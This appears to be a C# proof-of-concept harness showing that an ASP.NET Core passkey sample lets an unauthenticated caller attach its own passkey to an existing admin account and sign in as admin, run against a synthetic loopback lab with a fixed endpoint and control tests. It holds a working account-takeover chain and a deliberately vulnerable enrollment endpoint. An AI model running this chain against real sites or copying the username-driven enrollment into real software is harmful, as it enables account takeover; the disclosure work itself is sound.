using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Server.Kestrel.Core;

const string CandidateId = "DOTNET-ASPNETCORE-PASSKEY-SAMPLE-EXISTING-USER-TAKEOVER-20260920-R1";
const string ExactSdk = "11.0.100-rc.1.26425.128";
const string LabHost = "example.test";
const string ExpectedOrigin = "https://example.test";
const string AdminRole = "admin";

var evidenceDirectory = args.Length > 0
    ? Path.GetFullPath(args[0])
    : Path.GetFullPath("evidence-passkey-sample-takeover");
Directory.CreateDirectory(evidenceDirectory);

var runNonce = Convert.ToHexString(RandomNumberGenerator.GetBytes(24)).ToLowerInvariant();
var adminMarker = $"owned-passkey-admin-marker-{runNonce}";
var traces = new ConcurrentQueue<HttpTrace>();

var builder = WebApplication.CreateSlimBuilder(new WebApplicationOptions
{
    ApplicationName = typeof(Program).Assembly.GetName().Name,
    EnvironmentName = "Production",
});
builder.Logging.ClearProviders();
builder.WebHost.ConfigureKestrel(options =>
{
    options.Listen(IPAddress.Loopback, 0, listen => listen.Protocols = HttpProtocols.Http1);
    options.AddServerHeader = false;
});

builder.Services.AddSingleton<LabUserStore>();
builder.Services.AddSingleton<IUserStore<LabUser>>(services => services.GetRequiredService<LabUserStore>());
builder.Services.AddSingleton<IUserPasskeyStore<LabUser>>(services => services.GetRequiredService<LabUserStore>());

builder.Services
    .AddAuthentication(options =>
    {
        options.DefaultAuthenticateScheme = IdentityConstants.ApplicationScheme;
        options.DefaultChallengeScheme = IdentityConstants.ApplicationScheme;
        options.DefaultSignInScheme = IdentityConstants.ApplicationScheme;
    })
    .AddCookie(IdentityConstants.ApplicationScheme, options =>
    {
        options.Cookie.Name = ".AspNetCore.Owned.Passkey.Application";
        options.Cookie.HttpOnly = true;
        options.Cookie.SameSite = SameSiteMode.Lax;
        options.Events = new CookieAuthenticationEvents
        {
            OnRedirectToLogin = context =>
            {
                context.Response.StatusCode = StatusCodes.Status401Unauthorized;
                return Task.CompletedTask;
            },
            OnRedirectToAccessDenied = context =>
            {
                context.Response.StatusCode = StatusCodes.Status403Forbidden;
                return Task.CompletedTask;
            },
        };
    })
    .AddCookie(IdentityConstants.TwoFactorUserIdScheme, options =>
    {
        options.Cookie.Name = ".AspNetCore.Owned.Passkey.State";
        options.Cookie.HttpOnly = true;
        options.Cookie.SameSite = SameSiteMode.Lax;
        options.ExpireTimeSpan = TimeSpan.FromMinutes(5);
        options.Events = new CookieAuthenticationEvents
        {
            OnRedirectToReturnUrl = _ => Task.CompletedTask,
        };
    });

builder.Services.AddAuthorizationBuilder()
    .AddPolicy("admin", policy => policy
        .RequireAuthenticatedUser()
        .RequireRole(AdminRole));

builder.Services
    .AddIdentityCore<LabUser>(options =>
    {
        options.SignIn.RequireConfirmedAccount = false;
        options.SignIn.RequireConfirmedEmail = false;
        options.SignIn.RequireConfirmedPhoneNumber = false;
        options.User.RequireUniqueEmail = false;
    })
    .AddSignInManager();
builder.Services.AddScoped<IUserClaimsPrincipalFactory<LabUser>, LabClaimsPrincipalFactory>();
builder.Services.Configure<IdentityPasskeyOptions>(options =>
{
    options.ServerDomain = LabHost;
    options.UserVerificationRequirement = "required";
    options.AuthenticatorTimeout = TimeSpan.FromMinutes(5);
});

var app = builder.Build();
app.Use(async (context, next) =>
{
    var started = DateTimeOffset.UtcNow;
    var cookieHeader = context.Request.Headers.Cookie.ToString();
    await next(context);
    traces.Enqueue(new HttpTrace(
        StartedUtc: started,
        FinishedUtc: DateTimeOffset.UtcNow,
        Method: context.Request.Method,
        Path: context.Request.Path.Value ?? string.Empty,
        Host: context.Request.Host.Value,
        Origin: context.Request.Headers.Origin.ToString(),
        CookieHeaderSha256: string.IsNullOrEmpty(cookieHeader) ? null : Sha256Text(cookieHeader),
        StatusCode: context.Response.StatusCode,
        SetCookieCount: context.Response.Headers.SetCookie.Count));
});
app.UseAuthentication();
app.UseAuthorization();

app.MapPost("/sample/attestation/options", async (
    HttpContext context,
    UserManager<LabUser> userManager,
    SignInManager<LabUser> signInManager) =>
{
    var request = await ReadJsonAsync<UsernameRequest>(context);
    if (string.IsNullOrWhiteSpace(request?.Username))
    {
        return Results.BadRequest(new { error = "username-required" });
    }

    var existingUser = await userManager.FindByNameAsync(request.Username);
    var userId = (existingUser ?? new LabUser()).Id;
    var optionsJson = await signInManager.MakePasskeyCreationOptionsAsync(new PasskeyUserEntity
    {
        Id = userId,
        Name = request.Username,
        DisplayName = request.Username,
    });
    return Results.Text(optionsJson, "application/json", Encoding.UTF8);
});

app.MapPost("/sample/attestation/complete", async (
    HttpContext context,
    UserManager<LabUser> userManager,
    SignInManager<LabUser> signInManager,
    LabUserStore store) =>
{
    var credentialJson = await ReadBodyAsync(context);
    if (string.IsNullOrWhiteSpace(credentialJson))
    {
        return Results.BadRequest(new { error = "credential-required" });
    }

    var attestationResult = await signInManager.PerformPasskeyAttestationAsync(credentialJson);
    if (!attestationResult.Succeeded)
    {
        return Results.BadRequest(new
        {
            succeeded = false,
            failure = attestationResult.Failure.Message,
        });
    }

    var userEntity = attestationResult.UserEntity;
    var user = await userManager.FindByIdAsync(userEntity.Id);
    var existingUser = user is not null;
    if (user is null)
    {
        user = new LabUser
        {
            Id = userEntity.Id,
            UserName = userEntity.Name,
            NormalizedUserName = userEntity.Name.ToUpperInvariant(),
            Role = "user",
        };
        var createResult = await userManager.CreateAsync(user);
        if (!createResult.Succeeded)
        {
            return Results.Problem("Could not create the synthetic user.");
        }
    }

    var setPasskeyResult = await userManager.AddOrUpdatePasskeyAsync(user, attestationResult.Passkey);
    if (!setPasskeyResult.Succeeded)
    {
        return Results.Problem("Could not attach the passkey.");
    }

    return Results.Json(new
    {
        succeeded = true,
        targetUserId = user.Id,
        targetUserName = user.UserName,
        targetRole = user.Role,
        existingUser,
        passkeyCount = store.GetPasskeyCount(user.Id),
        credentialOwnerId = store.GetPasskeyOwnerId(attestationResult.Passkey.CredentialId),
    });
});

app.MapPost("/sample/assertion/options", async (
    HttpContext context,
    UserManager<LabUser> userManager,
    SignInManager<LabUser> signInManager) =>
{
    var request = await ReadJsonAsync<OptionalUsernameRequest>(context);
    var user = string.IsNullOrWhiteSpace(request?.Username)
        ? null
        : await userManager.FindByNameAsync(request.Username);
    var optionsJson = await signInManager.MakePasskeyRequestOptionsAsync(user);
    return Results.Text(optionsJson, "application/json", Encoding.UTF8);
});

app.MapPost("/sample/login", async (HttpContext context, SignInManager<LabUser> signInManager) =>
{
    var credentialJson = await ReadBodyAsync(context);
    var result = await signInManager.PasskeySignInAsync(credentialJson);
    return result.Succeeded
        ? Results.Json(new { succeeded = true })
        : Results.Json(new { succeeded = false }, statusCode: StatusCodes.Status401Unauthorized);
});

app.MapPost("/control/signin-low", async (SignInManager<LabUser> signInManager, LabUserStore store) =>
{
    await signInManager.SignInAsync(store.LowUser, isPersistent: false);
    return Results.Ok();
});

app.MapPost("/logout", async (HttpContext context) =>
{
    await context.SignOutAsync(IdentityConstants.ApplicationScheme);
    return Results.Ok();
});

app.MapPost("/fixed/attestation/options", async (
    HttpContext context,
    UserManager<LabUser> userManager,
    SignInManager<LabUser> signInManager) =>
{
    var currentUser = await userManager.GetUserAsync(context.User);
    if (currentUser is null)
    {
        return Results.Unauthorized();
    }
    var optionsJson = await signInManager.MakePasskeyCreationOptionsAsync(new PasskeyUserEntity
    {
        Id = currentUser.Id,
        Name = currentUser.UserName ?? currentUser.Id,
        DisplayName = currentUser.UserName ?? currentUser.Id,
    });
    return Results.Text(optionsJson, "application/json", Encoding.UTF8);
}).RequireAuthorization();

app.MapPost("/fixed/attestation/complete", async (
    HttpContext context,
    UserManager<LabUser> userManager,
    SignInManager<LabUser> signInManager,
    LabUserStore store) =>
{
    var currentUser = await userManager.GetUserAsync(context.User);
    if (currentUser is null)
    {
        return Results.Unauthorized();
    }

    var credentialJson = await ReadBodyAsync(context);
    var attestationResult = await signInManager.PerformPasskeyAttestationAsync(credentialJson);
    if (!attestationResult.Succeeded)
    {
        return Results.BadRequest(new
        {
            succeeded = false,
            failure = attestationResult.Failure.Message,
        });
    }
    if (!string.Equals(attestationResult.UserEntity.Id, currentUser.Id, StringComparison.Ordinal))
    {
        return Results.Json(new { succeeded = false, error = "principal-user-mismatch" }, statusCode: StatusCodes.Status403Forbidden);
    }

    var setResult = await userManager.AddOrUpdatePasskeyAsync(currentUser, attestationResult.Passkey);
    return setResult.Succeeded
        ? Results.Json(new
        {
            succeeded = true,
            targetUserId = currentUser.Id,
            targetRole = currentUser.Role,
            passkeyCount = store.GetPasskeyCount(currentUser.Id),
        })
        : Results.Problem("Could not attach the passkey to the authenticated user.");
}).RequireAuthorization();

app.MapGet("/me", (ClaimsPrincipal principal) => Results.Json(new
{
    authenticated = principal.Identity?.IsAuthenticated == true,
    userId = principal.FindFirstValue(ClaimTypes.NameIdentifier),
    userName = principal.Identity?.Name,
    role = principal.FindFirstValue(ClaimTypes.Role),
}));

app.MapGet("/admin", (ClaimsPrincipal principal) => Results.Json(new
{
    marker = adminMarker,
    userId = principal.FindFirstValue(ClaimTypes.NameIdentifier),
    role = principal.FindFirstValue(ClaimTypes.Role),
})).RequireAuthorization("admin");

await app.StartAsync();

try
{
    var addresses = app.Services.GetRequiredService<IServer>()
        .Features.Get<IServerAddressesFeature>()?.Addresses
        ?? throw new InvalidOperationException("Kestrel did not publish a bound address.");
    var listenAddress = addresses.Single(address => address.StartsWith("http://127.0.0.1:", StringComparison.Ordinal));
    var port = new Uri(listenAddress).Port;
    var store = app.Services.GetRequiredService<LabUserStore>();

    var attack = await RunAdminTakeoverAsync(port, store);
    var fixedControl = await RunAuthenticatedUserBindingControlAsync(port, store);
    var newUserControl = await RunNewUserControlAsync(port, store);
    var badSignatureControl = await RunBadSignatureControlAsync(port, store, attack);
    var badChallengeControl = await RunBadAttestationControlAsync(port, store, mutateOrigin: false);
    var badOriginControl = await RunBadAttestationControlAsync(port, store, mutateOrigin: true);
    var unauthenticatedFixedControl = await RunUnauthenticatedFixedControlAsync(port);

    var controls = new[]
    {
        fixedControl.Passed,
        newUserControl.Passed,
        badSignatureControl.Passed,
        badChallengeControl.Passed,
        badOriginControl.Passed,
        unauthenticatedFixedControl.Passed,
    };
    var controlsPassed = controls.All(value => value);
    var positive = attack.OptionsStatus == 200
        && attack.UserEntityMatchedAdmin
        && attack.CompletionStatus == 200
        && attack.ExistingAdminSelected
        && attack.CredentialOwnerIsAdmin
        && attack.LoginStatus == 200
        && attack.MeAuthenticated
        && attack.MeRole == AdminRole
        && attack.AdminStatus == 200
        && attack.AdminMarkerObserved;

    var verdict = positive && controlsPassed
        ? "POSITIVE_OFFICIAL_SAMPLE_UNAUTHENTICATED_PASSKEY_ENROLLMENT_TAKES_OVER_EXISTING_ADMIN"
        : positive
            ? "POSITIVE_CHAIN_OBSERVED_BUT_CONTROL_FAILURE"
            : "NEEDS_EVIDENCE_OR_NEGATIVE";

    var assemblies = BuildAssemblyEvidence(
        typeof(SignInManager<>).Assembly,
        typeof(UserManager<>).Assembly,
        typeof(CookieAuthenticationHandler).Assembly,
        typeof(WebApplication).Assembly,
        typeof(Program).Assembly);

    var final = new
    {
        Schema = "aspnetcore-passkey-sample-existing-user-takeover-v1",
        CandidateId,
        GeneratedUtc = DateTimeOffset.UtcNow,
        RunNonce = runNonce,
        Verdict = verdict,
        Positive = positive && controlsPassed,
        ExactSdk,
        Runtime = System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription,
        OS = System.Runtime.InteropServices.RuntimeInformation.OSDescription,
        Attack = attack,
        Controls = new
        {
            AuthenticatedUserBinding = fixedControl,
            NewUsernameCreatesOnlyLowPrivilegeUser = newUserControl,
            BadAssertionSignature = badSignatureControl,
            MutatedAttestationChallenge = badChallengeControl,
            WrongAttestationOrigin = badOriginControl,
            UnauthenticatedFixedEnrollment = unauthenticatedFixedControl,
            AllPassed = controlsPassed,
        },
        AdminMarkerSha256 = Sha256Text(adminMarker),
        HttpTraces = traces.ToArray(),
        Assemblies = assemblies,
        OfficialSource = new
        {
            Repository = "dotnet/aspnetcore",
            Commit = "c3325eeb6b47bc6383c127d4f4827dc9642a2b6e",
            SampleProgramBlob = "178973e84b931a78d77752b0c6ba18db40816eb0",
            SampleHomeBlob = "86603f89a268c770d36ddb2bf9650b3e45fe2e2a",
            SampleStoreBlob = "0b4da891f06b8de185e97dc327abe40b98d6a486",
        },
        BoundaryStatement = "An unauthenticated caller controls the username used by the official PasskeyUI sample to create WebAuthn registration state. When that username already exists, the state embeds the existing account ID; the sample later attaches the caller-created passkey to that account without authenticating the account owner. The caller then signs in with the new key and reaches the owned admin-only marker.",
        AuthorityDelta = new
        {
            Before = "Unauthenticated caller with no account cookie, no admin credential, and only an attacker-generated ES256 key.",
            After = "A passkey owned by the caller is attached to the pre-existing synthetic admin user, yielding an authenticated admin session and access to the admin-only marker.",
        },
        Limitations = new[]
        {
            "The harness uses only synthetic users, keys, passkeys, cookies, and an owned loopback server.",
            "It reproduces the official repository sample's account-selection and passkey-attachment logic using stock ASP.NET Core Identity APIs; it does not claim the secure Blazor project template has the same flaw.",
            "The sample UI includes antiforgery for its form, but the attacker uses their own browser session and intentionally submits the form, so CSRF is not part of the claimed chain.",
            "Bounty eligibility for a repository sample, severity, servicing, and private duplicate status remain separate decisions.",
        },
    };

    var jsonOptions = new JsonSerializerOptions { WriteIndented = true };
    await File.WriteAllTextAsync(
        Path.Combine(evidenceDirectory, "RESULT.json"),
        JsonSerializer.Serialize(final, jsonOptions) + Environment.NewLine,
        new UTF8Encoding(false));
    await File.WriteAllTextAsync(
        Path.Combine(evidenceDirectory, "ASSEMBLY_PROVENANCE.json"),
        JsonSerializer.Serialize(assemblies, jsonOptions) + Environment.NewLine,
        new UTF8Encoding(false));
    await File.WriteAllTextAsync(
        Path.Combine(evidenceDirectory, "SUMMARY.md"),
        BuildSummary(verdict, attack, fixedControl, newUserControl, badSignatureControl, badChallengeControl, badOriginControl, unauthenticatedFixedControl),
        new UTF8Encoding(false));

    var evidenceFiles = Directory.EnumerateFiles(evidenceDirectory, "*", SearchOption.AllDirectories)
        .Where(path => !string.Equals(Path.GetFileName(path), "SHA256SUMS.txt", StringComparison.Ordinal))
        .OrderBy(path => path, StringComparer.Ordinal)
        .ToArray();
    await File.WriteAllLinesAsync(
        Path.Combine(evidenceDirectory, "SHA256SUMS.txt"),
        evidenceFiles.Select(path => $"{Sha256File(path)}  {Path.GetRelativePath(evidenceDirectory, path).Replace('\\', '/')}"));

    Console.WriteLine(JsonSerializer.Serialize(new
    {
        CandidateId,
        Verdict = verdict,
        Positive = positive && controlsPassed,
        attack.AdminStatus,
        attack.AdminMarkerObserved,
        ControlsPassed = controlsPassed,
        EvidenceDirectory = evidenceDirectory,
    }, jsonOptions));

    return positive && controlsPassed ? 3 : controlsPassed ? 0 : 2;
}
finally
{
    await app.StopAsync();
    await app.DisposeAsync();
}

async Task<AdminTakeoverResult> RunAdminTakeoverAsync(int port, LabUserStore store)
{
    using var passkey = SyntheticPasskey.CreateEs256();
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);

    var options = await SendJsonAsync(client, HttpMethod.Post, "/sample/attestation/options", ExpectedOrigin, new
    {
        username = store.Admin.UserName,
    });
    var attestation = passkey.CreateAttestation(options.Body, ExpectedOrigin, store.Admin.Id);
    var completion = await SendRawJsonAsync(client, "/sample/attestation/complete", ExpectedOrigin, attestation.CredentialJson);
    var completionFacts = ParseCompletionFacts(completion.Body);

    using var loginJar = new CookieContainer();
    using var loginHandler = CreateHandler(loginJar, port);
    using var loginClient = CreateClient(loginHandler, port);
    var requestOptions = await SendJsonAsync(loginClient, HttpMethod.Post, "/sample/assertion/options", ExpectedOrigin, new
    {
        username = store.Admin.UserName,
    });
    var assertion = passkey.CreateAssertion(requestOptions.Body, ExpectedOrigin, store.Admin.Id, signCount: 2);
    var login = await SendRawJsonAsync(loginClient, "/sample/login", ExpectedOrigin, assertion.CredentialJson);
    var me = await SendAsync(loginClient, HttpMethod.Get, "/me", ExpectedOrigin, body: null, contentType: null);
    var meFacts = ParseIdentityFacts(me.Body);
    var admin = await SendAsync(loginClient, HttpMethod.Get, "/admin", ExpectedOrigin, body: null, contentType: null);

    return new AdminTakeoverResult(
        OptionsStatus: options.StatusCode,
        OptionsBodySha256: Sha256Text(options.Body),
        UserEntityMatchedAdmin: attestation.UserEntityMatchesExpected,
        AttestationCredentialSha256: Sha256Text(attestation.CredentialJson),
        CompletionStatus: completion.StatusCode,
        CompletionBodySha256: Sha256Text(completion.Body),
        ExistingAdminSelected: completionFacts.ExistingUser
            && string.Equals(completionFacts.TargetUserId, store.Admin.Id, StringComparison.Ordinal)
            && string.Equals(completionFacts.TargetRole, AdminRole, StringComparison.Ordinal),
        CredentialOwnerIsAdmin: string.Equals(store.GetPasskeyOwnerId(passkey.CredentialId), store.Admin.Id, StringComparison.Ordinal),
        AdminPasskeyCount: store.GetPasskeyCount(store.Admin.Id),
        AssertionOptionsStatus: requestOptions.StatusCode,
        AssertionCredentialSha256: Sha256Text(assertion.CredentialJson),
        LoginStatus: login.StatusCode,
        MeStatus: me.StatusCode,
        MeAuthenticated: meFacts.Authenticated,
        MeUserId: meFacts.UserId,
        MeRole: meFacts.Role,
        AdminStatus: admin.StatusCode,
        AdminMarkerObserved: admin.Body.Contains(adminMarker, StringComparison.Ordinal));
}

async Task<ControlResult> RunAuthenticatedUserBindingControlAsync(int port, LabUserStore store)
{
    using var passkey = SyntheticPasskey.CreateEs256();
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);

    var signIn = await SendAsync(client, HttpMethod.Post, "/control/signin-low", ExpectedOrigin, body: null, contentType: null);
    var options = await SendAsync(client, HttpMethod.Post, "/fixed/attestation/options", ExpectedOrigin, body: null, contentType: null);
    var attestation = passkey.CreateAttestation(options.Body, ExpectedOrigin, store.LowUser.Id);
    var completion = await SendRawJsonAsync(client, "/fixed/attestation/complete", ExpectedOrigin, attestation.CredentialJson);
    await SendAsync(client, HttpMethod.Post, "/logout", ExpectedOrigin, body: null, contentType: null);

    using var loginJar = new CookieContainer();
    using var loginHandler = CreateHandler(loginJar, port);
    using var loginClient = CreateClient(loginHandler, port);
    var requestOptions = await SendJsonAsync(loginClient, HttpMethod.Post, "/sample/assertion/options", ExpectedOrigin, new
    {
        username = store.LowUser.UserName,
    });
    var assertion = passkey.CreateAssertion(requestOptions.Body, ExpectedOrigin, store.LowUser.Id, signCount: 2);
    var login = await SendRawJsonAsync(loginClient, "/sample/login", ExpectedOrigin, assertion.CredentialJson);
    var me = await SendAsync(loginClient, HttpMethod.Get, "/me", ExpectedOrigin, body: null, contentType: null);
    var meFacts = ParseIdentityFacts(me.Body);
    var admin = await SendAsync(loginClient, HttpMethod.Get, "/admin", ExpectedOrigin, body: null, contentType: null);

    var passed = signIn.StatusCode == 200
        && options.StatusCode == 200
        && attestation.UserEntityMatchesExpected
        && completion.StatusCode == 200
        && string.Equals(store.GetPasskeyOwnerId(passkey.CredentialId), store.LowUser.Id, StringComparison.Ordinal)
        && login.StatusCode == 200
        && meFacts.Authenticated
        && string.Equals(meFacts.Role, "user", StringComparison.Ordinal)
        && admin.StatusCode == 403
        && !admin.Body.Contains(adminMarker, StringComparison.Ordinal);

    return new ControlResult(
        Id: "authenticated-current-user-binding",
        StatusSequence: [signIn.StatusCode, options.StatusCode, completion.StatusCode, login.StatusCode, me.StatusCode, admin.StatusCode],
        Passed: passed,
        Detail: "Authenticated low user receives a creation state for only that user; the resulting key signs in as low and is denied by the admin policy.");
}

async Task<ControlResult> RunNewUserControlAsync(int port, LabUserStore store)
{
    using var passkey = SyntheticPasskey.CreateEs256();
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);
    var username = $"owned-new-{runNonce[..12]}@example.test";

    var options = await SendJsonAsync(client, HttpMethod.Post, "/sample/attestation/options", ExpectedOrigin, new { username });
    var generatedUserId = DecodeCreationUserId(options.Body);
    var attestation = passkey.CreateAttestation(options.Body, ExpectedOrigin, generatedUserId);
    var completion = await SendRawJsonAsync(client, "/sample/attestation/complete", ExpectedOrigin, attestation.CredentialJson);
    var completionFacts = ParseCompletionFacts(completion.Body);

    using var loginJar = new CookieContainer();
    using var loginHandler = CreateHandler(loginJar, port);
    using var loginClient = CreateClient(loginHandler, port);
    var requestOptions = await SendJsonAsync(loginClient, HttpMethod.Post, "/sample/assertion/options", ExpectedOrigin, new { username });
    var assertion = passkey.CreateAssertion(requestOptions.Body, ExpectedOrigin, generatedUserId, signCount: 2);
    var login = await SendRawJsonAsync(loginClient, "/sample/login", ExpectedOrigin, assertion.CredentialJson);
    var me = await SendAsync(loginClient, HttpMethod.Get, "/me", ExpectedOrigin, body: null, contentType: null);
    var meFacts = ParseIdentityFacts(me.Body);
    var admin = await SendAsync(loginClient, HttpMethod.Get, "/admin", ExpectedOrigin, body: null, contentType: null);

    var passed = options.StatusCode == 200
        && attestation.UserEntityMatchesExpected
        && completion.StatusCode == 200
        && !completionFacts.ExistingUser
        && string.Equals(completionFacts.TargetUserId, generatedUserId, StringComparison.Ordinal)
        && string.Equals(completionFacts.TargetRole, "user", StringComparison.Ordinal)
        && string.Equals(store.GetPasskeyOwnerId(passkey.CredentialId), generatedUserId, StringComparison.Ordinal)
        && login.StatusCode == 200
        && meFacts.Authenticated
        && string.Equals(meFacts.Role, "user", StringComparison.Ordinal)
        && admin.StatusCode == 403
        && !admin.Body.Contains(adminMarker, StringComparison.Ordinal);

    return new ControlResult(
        Id: "new-username-low-privilege-control",
        StatusSequence: [options.StatusCode, completion.StatusCode, login.StatusCode, me.StatusCode, admin.StatusCode],
        Passed: passed,
        Detail: "An unknown username follows the intended registration behavior and creates only a new low-privilege user, not admin authority.");
}

async Task<ControlResult> RunBadSignatureControlAsync(int port, LabUserStore store, AdminTakeoverResult attack)
{
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);

    var requestOptions = await SendJsonAsync(client, HttpMethod.Post, "/sample/assertion/options", ExpectedOrigin, new
    {
        username = store.Admin.UserName,
    });

    using var controlKey = SyntheticPasskey.CreateEs256();
    using var enrollmentJar = new CookieContainer();
    using var enrollmentHandler = CreateHandler(enrollmentJar, port);
    using var enrollmentClient = CreateClient(enrollmentHandler, port);
    await SendAsync(enrollmentClient, HttpMethod.Post, "/control/signin-low", ExpectedOrigin, body: null, contentType: null);
    var creationOptions = await SendAsync(enrollmentClient, HttpMethod.Post, "/fixed/attestation/options", ExpectedOrigin, body: null, contentType: null);
    var attestation = controlKey.CreateAttestation(creationOptions.Body, ExpectedOrigin, store.LowUser.Id);
    var complete = await SendRawJsonAsync(enrollmentClient, "/fixed/attestation/complete", ExpectedOrigin, attestation.CredentialJson);
    await SendAsync(enrollmentClient, HttpMethod.Post, "/logout", ExpectedOrigin, body: null, contentType: null);

    using var badJar = new CookieContainer();
    using var badHandler = CreateHandler(badJar, port);
    using var badClient = CreateClient(badHandler, port);
    var lowRequestOptions = await SendJsonAsync(badClient, HttpMethod.Post, "/sample/assertion/options", ExpectedOrigin, new
    {
        username = store.LowUser.UserName,
    });
    var validAssertion = controlKey.CreateAssertion(lowRequestOptions.Body, ExpectedOrigin, store.LowUser.Id, signCount: 2);
    var badCredential = SyntheticPasskey.FlipAssertionSignatureBit(validAssertion.CredentialJson);
    var login = await SendRawJsonAsync(badClient, "/sample/login", ExpectedOrigin, badCredential);
    var me = await SendAsync(badClient, HttpMethod.Get, "/me", ExpectedOrigin, body: null, contentType: null);
    var facts = ParseIdentityFacts(me.Body);

    var passed = attack.LoginStatus == 200
        && complete.StatusCode == 200
        && login.StatusCode == 401
        && !facts.Authenticated;
    return new ControlResult(
        Id: "bit-flipped-assertion-signature",
        StatusSequence: [requestOptions.StatusCode, creationOptions.StatusCode, complete.StatusCode, lowRequestOptions.StatusCode, login.StatusCode, me.StatusCode],
        Passed: passed,
        Detail: "A bit-flipped ES256 assertion is rejected, proving successful login depends on possession of the enrolled private key.");
}

async Task<ControlResult> RunBadAttestationControlAsync(int port, LabUserStore store, bool mutateOrigin)
{
    using var passkey = SyntheticPasskey.CreateEs256();
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);
    var username = $"bad-{(mutateOrigin ? "origin" : "challenge")}-{runNonce[..10]}@example.test";

    var options = await SendJsonAsync(client, HttpMethod.Post, "/sample/attestation/options", ExpectedOrigin, new { username });
    var generatedUserId = DecodeCreationUserId(options.Body);
    string? challengeOverride = null;
    string? originOverride = null;
    if (mutateOrigin)
    {
        originOverride = "https://attacker.invalid";
    }
    else
    {
        using var document = JsonDocument.Parse(options.Body);
        challengeOverride = MutateBase64Url(document.RootElement.GetProperty("challenge").GetString()
            ?? throw new InvalidOperationException("Challenge missing."));
    }

    var attestation = passkey.CreateAttestation(
        options.Body,
        ExpectedOrigin,
        generatedUserId,
        challengeOverride,
        originOverride);
    var completion = await SendRawJsonAsync(client, "/sample/attestation/complete", ExpectedOrigin, attestation.CredentialJson);

    using var scope = app.Services.CreateScope();
    var userManager = scope.ServiceProvider.GetRequiredService<UserManager<LabUser>>();
    var createdUser = await userManager.FindByIdAsync(generatedUserId);
    var passed = options.StatusCode == 200
        && completion.StatusCode == 400
        && createdUser is null
        && store.GetPasskeyOwnerId(passkey.CredentialId) is null;

    return new ControlResult(
        Id: mutateOrigin ? "wrong-attestation-origin" : "mutated-attestation-challenge",
        StatusSequence: [options.StatusCode, completion.StatusCode],
        Passed: passed,
        Detail: mutateOrigin
            ? "Attestation from a different origin is rejected and creates no user or credential binding."
            : "Attestation with a different challenge is rejected and creates no user or credential binding.");
}

async Task<ControlResult> RunUnauthenticatedFixedControlAsync(int port)
{
    using var jar = new CookieContainer();
    using var handler = CreateHandler(jar, port);
    using var client = CreateClient(handler, port);
    var response = await SendAsync(client, HttpMethod.Post, "/fixed/attestation/options", ExpectedOrigin, body: null, contentType: null);
    return new ControlResult(
        Id: "unauthenticated-fixed-enrollment-denied",
        StatusSequence: [response.StatusCode],
        Passed: response.StatusCode == 401,
        Detail: "The matched current-user-bound endpoint refuses unauthenticated passkey enrollment.");
}

static SocketsHttpHandler CreateHandler(CookieContainer jar, int port) => new()
{
    UseCookies = true,
    CookieContainer = jar,
    UseProxy = false,
    AllowAutoRedirect = false,
    PooledConnectionLifetime = TimeSpan.Zero,
    PooledConnectionIdleTimeout = TimeSpan.Zero,
    ConnectTimeout = TimeSpan.FromSeconds(3),
    ConnectCallback = async (_, cancellationToken) =>
    {
        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
            NoDelay = true,
        };
        try
        {
            await socket.ConnectAsync(IPAddress.Loopback, port, cancellationToken);
            return new NetworkStream(socket, ownsSocket: true);
        }
        catch
        {
            socket.Dispose();
            throw;
        }
    },
};

static HttpClient CreateClient(HttpMessageHandler handler, int port) => new(handler, disposeHandler: false)
{
    BaseAddress = new Uri($"http://{LabHost}:{port}"),
    Timeout = TimeSpan.FromSeconds(10),
    DefaultRequestVersion = HttpVersion.Version11,
    DefaultVersionPolicy = HttpVersionPolicy.RequestVersionExact,
};

static async Task<HttpResult> SendJsonAsync(
    HttpClient client,
    HttpMethod method,
    string path,
    string origin,
    object value)
    => await SendAsync(client, method, path, origin, JsonSerializer.Serialize(value), "application/json");

static async Task<HttpResult> SendRawJsonAsync(
    HttpClient client,
    string path,
    string origin,
    string json)
    => await SendAsync(client, HttpMethod.Post, path, origin, json, "application/json");

static async Task<HttpResult> SendAsync(
    HttpClient client,
    HttpMethod method,
    string path,
    string origin,
    string? body,
    string? contentType)
{
    using var request = new HttpRequestMessage(method, path)
    {
        Version = HttpVersion.Version11,
        VersionPolicy = HttpVersionPolicy.RequestVersionExact,
    };
    request.Headers.TryAddWithoutValidation("Origin", origin);
    if (body is not null)
    {
        request.Content = new StringContent(body, Encoding.UTF8, contentType ?? "application/octet-stream");
    }
    using var response = await client.SendAsync(request);
    var responseBody = await response.Content.ReadAsStringAsync();
    return new HttpResult((int)response.StatusCode, responseBody);
}

static async Task<T?> ReadJsonAsync<T>(HttpContext context)
{
    try
    {
        return await context.Request.ReadFromJsonAsync<T>(cancellationToken: context.RequestAborted);
    }
    catch (JsonException)
    {
        return default;
    }
}

static async Task<string> ReadBodyAsync(HttpContext context)
{
    using var reader = new StreamReader(
        context.Request.Body,
        Encoding.UTF8,
        detectEncodingFromByteOrderMarks: false,
        leaveOpen: true);
    return await reader.ReadToEndAsync(context.RequestAborted);
}

static string DecodeCreationUserId(string creationOptionsJson)
{
    using var document = JsonDocument.Parse(creationOptionsJson);
    var encoded = document.RootElement.GetProperty("user").GetProperty("id").GetString()
        ?? throw new InvalidOperationException("Creation options omitted user.id.");
    return Encoding.UTF8.GetString(SyntheticPasskey.Base64UrlDecode(encoded));
}

static CompletionFacts ParseCompletionFacts(string body)
{
    using var document = JsonDocument.Parse(body);
    var root = document.RootElement;
    return new CompletionFacts(
        ExistingUser: root.TryGetProperty("existingUser", out var existing) && existing.GetBoolean(),
        TargetUserId: root.TryGetProperty("targetUserId", out var userId) ? userId.GetString() : null,
        TargetRole: root.TryGetProperty("targetRole", out var role) ? role.GetString() : null);
}

